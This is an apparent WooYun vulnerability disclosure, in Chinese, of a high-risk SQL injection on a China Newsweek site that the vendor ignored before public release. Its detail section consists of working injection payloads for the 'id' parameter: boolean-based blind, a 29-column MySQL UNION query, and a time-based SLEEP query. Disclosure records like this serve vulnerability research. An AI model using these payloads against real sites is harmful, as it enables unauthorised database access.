wybug_title: 中国新闻周刊某处高危SQL注射漏洞
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-01-25：	细节已通知厂商并且等待厂商处理中									2015-01-30：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 高危注射 详细说明：  
Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=72136 AND 2588=2588    Type: UNION query    Title: MySQL UNION query (NULL) - 29 columns    Payload: id=-5033 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3a6a65743a,0x5a705561696d714b4264,0x3a7177613a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=72136 AND SLEEP(5)---
